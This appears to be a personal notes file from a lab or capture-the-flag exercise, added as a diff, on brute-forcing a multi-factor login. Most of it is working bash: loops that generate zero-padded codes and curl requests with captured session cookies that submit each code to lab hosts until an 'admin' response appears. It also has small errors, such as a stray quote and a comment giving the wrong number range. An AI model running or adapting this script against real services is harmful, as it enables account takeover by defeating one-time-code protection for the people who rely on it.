@@ -1,0 +1,98 @@
+Brute force MFA
+
+nano -c exploit.sh
+
+for i in {1..10000}
+do
+
+echo $i;
+
+done
+~ bash exploit.sh
+(this should list 1-xxxx down the lh side
+
+======================================
+
+for i in $(seq -f "%04g" 0 1000)
+do
+
+echo $i;
+
+done
+
+(This will add the 0 padding to each number generated ie, 999 = 0999)
+=====================================
+
+
+
+(this will itterate all the numbers from 1-10000 sequentially)
+================================================
+Right click on POST request in Proxy, http history,copy as CURL command, this can be used to edit what you need, you can also extract the session key from this
+curl -i -s -k -X 'POST' -b 'session=eyJfZnJlc2giOmZhbHNlfQ.YpjGZQ.VDnGzP6rSslxZnJTs1rpy-lJ4xE' --data 'mfa_token=2000' http://10.102.11.133/prompt'
+
+================================================
+
+REQUEST=`curl -i -s -k -X 'POST' -b 'session=eyJfZnJlc2giOmZhbHNlfQ.ZHit9w.JKNZzIJkZqsIY1bk-7oD6uVLLJ0' --data 'mfa_token=$i' -H "Content-Type: application/x-www-form-urlencoded" http://10.102.131.79/prompt | grep admin`
+
+================================================
+
+## 1 2 3 4 5 
+## 0001 0002 0003 0004
+##
+###
+
+for j in {1..6} ##this will bruteforce 1-99999
+do
+
+	MAX=$((10**$j));
+	#j=1 MAX=10
+	#j=2 MAX=100
+	#j=3 MAX=1000
+	for i in $(seq -f "%0"$j"g" 0 $MAX)
+	do
+	echo $i;
+	REQUEST=`curl -i -s -k -X 'POST' -b 'session=eyJfZnJlc2giOmZhbHNlfQ.ZHit9w.JKNZzIJkZqsIY1bk-7oD6uVLLJ0' --data 'mfa_token='$i -H "Content-Type: application/x-www-form-urlencoded" http://10.102.131.79/prompt | grep admin|wc -l`
+	echo $REQUEST;
+	if [ $REQUEST -ne '0' ]
+	then
+	echo "WIN";
+	exit;
+	
+	fi
+	
+	
+
+	done
+done
+
+================================================================
+
+# 1 2 3 4 5 
+## 0001 0002 0003 0004
+##
+###
+
+for j in {6..7} ## this will brute force 1-999999 Will take some time!
+do
+
+        MAX=$((10**$j));
+        #j=1 MAX=10
+        #j=2 MAX=100
+        #j=3 MAX=1000
+        for i in $(seq -f "%0"$j"g" 0 $MAX)
+        do
+        echo $i;
+        REQUEST=`curl -i -s -k -X 'POST' -b 'session=eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIm1mYV9zZW50Il19XSwiX2ZyZXNoIjpmYWxzZX0.ZHtM1Q.iuRJJURrQ4cyEwbsTBwhal6nD04' --data 'mfa_token='$i -H "Content-Type: application/x-www-form-urlencoded" http://10.102.85.15/prompt | grep admin|wc -l`
+        echo $REQUEST;
+        if [ $REQUEST -ne '0' ]
+        then
+        echo "WIN";
+        exit;
+        
+        fi
+        
+        
+
+        done
+done
+
